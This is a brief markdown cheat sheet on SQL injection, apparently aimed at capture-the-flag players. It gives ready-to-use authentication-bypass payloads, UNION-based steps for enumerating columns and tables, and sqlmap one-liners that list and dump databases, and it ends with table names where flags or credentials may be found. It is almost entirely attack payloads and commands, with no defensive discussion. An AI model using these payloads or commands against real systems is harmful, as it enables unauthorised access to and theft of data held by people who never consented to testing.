# SQL Injection Basics

SQL injection inserts attacker-controlled SQL into a query the server builds from user input.

## Spotting it
Append a single quote `'` to any parameter. A raw SQL error (`syntax error near...`, `You have an error in your SQL syntax`) confirms the input is unsanitised.

## Auth bypass payloads
- Username field: `' OR '1'='1` — makes the WHERE clause always true, returns first row (usually admin)
- Comment trick: `admin'--` — comments out the password check entirely
- Space alternative: `admin'#`

## Enumeration
1. Count columns: `ORDER BY 1`, `ORDER BY 2` … until you get an error
2. Find visible columns: `' UNION SELECT NULL,NULL,NULL--`
3. Extract DB info: `' UNION SELECT table_name,NULL FROM information_schema.tables--`

## sqlmap one-liners
```
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/login" --data="user=a&pass=b" --level=3 --risk=2 --dump
```

## Where to look for flags
Check tables named `users`, `admin`, `flag`, `secret`, `credentials`.
